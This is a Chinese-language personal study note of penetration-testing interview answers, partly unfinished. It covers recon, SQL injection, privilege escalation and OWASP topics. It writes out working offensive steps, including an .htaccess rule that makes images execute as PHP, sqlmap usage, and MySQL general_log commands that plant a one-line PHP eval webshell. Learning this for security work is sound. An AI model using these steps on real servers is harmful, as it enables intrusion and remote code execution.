# 2023届面试题个人学习记录总结

> **按照技术种类划分试题**

## 技术篇——WEB

### 1. 渗透的流程 or 拿到一个待检测的站，你觉得应该做什么？

> 首先拿到书面的授权书
>
> 1. 信息收集 [2022渗透测试面试大全（过来人的全部家底） (chowdera.com)](https://chowdera.com/2022/122/202205022132180805.html#渗透测试流程)
>    + 给了一个网址，whois反查信息，获取域名注册者的邮箱和手机号等信息；
>    + 查看是否有CDN；🚩
>    + 查询服务器旁站以及子域名站点，因为主站一般比较难渗透，所有先看看旁站有没有通用醒的cms或者其他漏洞；
>    + 查看服务器操作系统版本，web中间件，看看是否存在已知的漏洞，例如IIS、Apache、Nginx的解析漏洞；
>    + 扫描IP端口，进行IP端口的扫描，对响应的端口进行探测，比如mysql-3306、ftp-21、ssh-22等；
>    + 扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄露。
>    + google hack 进一步探测网站的信息，后台，敏感文件；
>    + 可以对网站架构探测-获取网站的插件信息，比如所js版本、cms类型，中间件信息。如火狐插件wappalyzer，cms指纹识别；
>    + 资产收集工具-灯塔系统。
> 2. 漏洞扫描
>    + 开始检测漏洞，使用漏扫工具，如awvs、nessus、appscan、xray。同时，配合手动测试，如SQL注入、xss跨站脚本、CSRF跨站请求伪造、XXE漏洞、ssrf服务端请求伪造、文件上传、文件包含、远程代码执行、越权访问、反序列化、文件解析漏洞等。
> 3. 漏洞利用
>    + 可以利用一些方式拿到webshell。如SQL注入-sqlmap，xss跨站脚本-Beef-xss、抓包工具-burp、文件上传漏洞-一句话木马；
> 4. 权限提升
>    + 获得了webshell后，一般权限很低，需要进行提权操作。在这里先简单介绍提取方式
>    + windows提权：内核漏洞、服务配置错误等
>    + linux提权：suid、内核漏洞、docker逃逸等
>    + mysql提权：udf、mof等

### 2. 如何查找部署CDN网站的真实IP?    ***

> 1. 子域名解析
> 2. 国外dns获取真实ip；
> 3. ico图标通过空间搜索找真实ip
> 4. 

### 3. 业务逻辑漏洞  ***

> 1. 越权漏洞
>    + 水平越权：一般是修改get或post参数来查看其他人的业务信息，一般是在订单处或个人信息处。例如：2个账号，修改账号1的get或post数据包参数去查看账号2的信息。
>    + 垂直越权：两个账号，一个普通账号、一个管理员账号，抓包修改管理员的参数，权限改变，普通账号拥有管理员的部分或全部权限。
> 2. 密码找回
>    + 攻击者只要通过在本地抓取数据包并对其内容加以分析就能获取到其他用户的用户凭证，从而达到重置任意用户密码的目的；
>    + 

### 4. owasp top10

![Mapping](E:\md笔记资料\2023届面试题个人总结.assets\mapping.png)

~~~
A01:2021-权限控制失效
A02:2021-加密机制失效
A03:2021-注入式攻击
A04:2021-不安全设计 
A05:2021-安全设定缺陷
A06:2021-危险或过旧的组件 
A07:2021-认证及验证机制失效
A08:2021-软件及资料完整性失效 
A09:2021-安全记录及监控失效 
A10:2021-服务器端请求伪造 
~~~

### 5. 拿到一个 webshell 发现网站根目录下有.htaccess 文件，我们能做什么？

> 修改htaccess文件的内容，从而插入解析信息：
>
> <FilesMatch "xxx.jpg"> SetHandler application/x-httpd-php  \</FilesMatch>
> 
> 这样就制造了个apache解析漏洞, xxx.jpg 文件会被解析成.php 文件。

### 6. 在某后台新闻编辑界面看到编辑器，应该先做什么？

> 查看编辑器的版本信息，google 公开的EXP

### 7. 3389端口无法连接的情况？

> 1. 本来3389端口就没打开
> 2. 处于内网，需要端口转发 ，使用lcx工具
> 3. 端口被修改了
> 4. 防护拦截

### 8. 如何手工快速判断目标站是 windows 还是 linux 服务器？

> 尝试在数据包中传参，Linux大小写敏感，windows大小写不敏感

### 9. SQL注入

> 1. **简介**
>
>    + 主要原因就是程序员在开发用户和数据库交互的系统时没有对用户输入的字符串进行过滤、转义，限制或处理不严谨，导致用户可以通过输入精心构造的字符串去非法获取到数据库中的信息。
>
> 2. **分类**
>
>    + 依据注入点类型分类：
>
>      + 数字型注入
>      + 字符型注入
>      + 搜索型注入（like）
>
>    + 依据获取信息的方式分类：
>
>      + 联合注入
>
>      + 基于时间的盲注（根据数据包返回延迟判断）
>
>      + 基于布尔的盲注（根据返回页面判断条件真假）
>
>      + 基于报错注入（页面会返回报错信息）
>
>      + 堆叠注入（同时执行多条语句）
>
>    + 依据提交方式分类：
>
>      + GET注入
>      + POST注入
>      + COOKIE注入
>      + HTTP头注入（XFF注入、UA注入、Referer注入）
>
> 3. **防御 :triangular_flag_on_post:**
>
>    + 使用预编译语句，绑定变量
>    + 过滤特殊字符
>    + 检查变量的数据类型和格式
>    + 使用白名单来规范化输入验证方法
>
> 4. **绕过waf**
>
>    + 替换关键词
>    + 替换大小写
>    + 插入注释
>    + 编码：16进制编码、Unicode编码
>    + 特殊符号
>    + 缓冲区溢出
>
> 5. **SQL注入流程**
>
>    + 首先判断注入是否有回显，有回显尝试联合查询，无回显查看是否有数据库报错信息，有报错信息尝试报错注入；无回显无报错信息尝试盲注；
>    + sqlmap怎么对一个注入点注入？
>      + get提交：sqlmap -u 注入点网址
>      + post提交：sqlmap -u “注入点网址” --data=“post参数” 或者 sqlmap -r “数据包文件”
>      + 如果是http头里面的字段等信息，可以访问的时候，⽤ burpsuite 抓包，**注⼊处⽤*号替换**，放到⽂件⾥，然后sqlmap -r "⽂件地址”
>
> 6. **布尔盲注和延时盲注的共同点？**
>
>    + 都是一个字符一个字符的判断
>
> 7. **报错注入函数**
>
>    + updatexml()
>    + extractvalue()
>    + floor()
>
> 8. **information_schema数据表获取信息**
>
>    + 获取数据库名
>
>      select schema_name from information_schema.schemata
>
>    + 获取数据表名
>
>      select table_name from information_schema.tables
>
>    + 获取字段名
>
>      select * from information_schema.columns where table_name = “” and table_schema=“”
>
>    + 获取数据
>
>    + select id,user,password from user

### 10. Windows和Linux上提权的方式

**Linux提权**

> 1. 内核提权（脏牛）
> 2. suid提权
> 3. 定时任务提权
> 4. passwd提权
> 5. ssh密钥提权：获取到了.ssh目录下用户的私钥
> 6. 环境劫持提权：利用的两个条件：1）存在带有suid的文件；2）suid文件存在系统命令
> 7. shadow文件中root的密码被破解提权
> 8. sudo提权
> 9. 。。。。

**Windows提权**

> 1. 内核提权（烂土豆）
> 2. windows系统配置错误提权
> 3. 本地dll配置文件提权
> 4. SqlServer提权
> 5. mysql提权
> 6. 。。。。。

### 11. mysql写shell需要哪些条件

> 1. root权限
> 2. 知道网站的路径而且拥有写权限，能够通过into outfile 和 into dumpfile
> 3. secure-file-priv=
> 4. gpc关闭

### 12. **phpmyadmin如果不能通过out file写shell，还有哪些方式。**

> 利用：日志备份获取shell
>
> general_log 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中。可以尝试自定义日志文件，并向日志文件里面写入内容的话
>
> 

查看当前日志文件：

~~~mysql
 SHOW VARIABLES LIKE 'general%';
~~~


开启日志记录

~~~mysql
set global general_log = "ON";
~~~

更改日志文件路径

~~~mysql
set global general_log_file='C:\\xampp\\htdocs\\tieuhoc\\b.php'
~~~

往日志文件里写入一句话木马

~~~mysql
select '<?php @eval($_POST[cmd]);?>';
~~~

### 13. 如果不是默认路径，如何去获得写shell的路。

> 1. 数据库查询：show variales like %basedir%;
> 2. 查看phpinfo
> 3. 查看mysql安装情况
> 4. 报错信息

### 14. sql注入获取mysql本身路径的函数

>  @@datadir

### 15. JWT 

> Json Web Token
>
> JWT由三部分组成，Header.Payload.Signature

### 16. xss弹框函数

> alert 、prompt、confirm、console.log()等等

### 17. **如果localhost，127.0.0.1被封禁，如何绕过**

>  10进制ip地址转换为16进制

### 18. **命令执行，不回显如何拿结果，不出网如何**

> 延时（ping -c xxx.xxx.xxx.xxx）,dnslog,http请求,命令内容输出到特定文件并下载

### 19. **如何利用任意文件下载漏洞**

> 任意文件下载漏洞的话，可以下载一些敏感文件或信息，比如db.config可以获得数据库的账号密码

### 20. **如何知道网站目录，tomcat的路径。**

> 报错，通过代码：application.getRealPath()获得项目的路径。

### 21. **CSRF如何修复**

> 增加Token 和 Referer字段

### 22. referer可以绕过，如何检测referer能否被绕过

> 使用子域名绕过，域名增加a-z和0-9可以绕过，域名重写

### 23. **shiro反序列化原理**

>  Shiro 可以帮助我们完成：认证、授权、加密、会话管理、与Web 集成、缓存等。

Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。

### **24.主流的shiro检测key爆破原理，不出网如何检测**



### **25.如何判断使用fastjson**



### **26.fastjson的gadget**



### **27.如果一个网站被上传了webshell，如何排查入侵点**

> 先使用一些工具，对全站源码进行扫描，对网站修改时间进行排查，查看日志文件，网络连接、进程分析等等

### **28.预编译原理**

> 提前编译SQL语句，将所有的用户输入都当做数据，而非语法；
>
> 预编译会让数据库跳过编译阶段，也就无法进行词法分析，关键字不会被拆开，所有参数直接变成字符串，进入数据库执行器执行

### **29.udf提权的条件**

> 

## 技术篇——内网



## 技术篇——系统运维



## 技术篇——网络

## 个人通用篇

1. 自我介绍
2. 